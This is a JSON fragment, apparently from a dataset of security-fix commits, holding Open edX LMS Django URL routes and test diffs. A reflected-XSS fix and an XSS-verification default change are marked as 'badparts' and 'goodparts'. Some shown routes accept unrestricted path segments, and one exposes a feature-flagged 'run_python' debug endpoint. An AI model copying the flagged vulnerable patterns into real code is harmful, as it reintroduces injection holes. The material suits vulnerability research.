url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."}, "1162dbc18fda91b07a5942873387d60fd67b2cfc": {"url": "https://api.github.com/repos/h4ppyy/m-mooc/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc", "html_url": "https://github.com/h4ppyy/m-mooc/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc", "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "keyword": "XSS check", "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "message": "", "files": {"/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {"changes": [{"diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n", "add": 1, "remove": 1, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["    def _expected_command(self, name, store=None, verify_xss=False):"], "goodparts": ["    def _expected_command(self, name, store=None, verify_xss=True):"]}, {"diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'", "add": 2, "remove": 2, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["        self.env_var_override.set('VERIFY_XSS', 'True')", "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"], "goodparts": ["        self.env_var_override.set('VERIFY_XSS', 'False')", "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))"]}], "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ", "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n 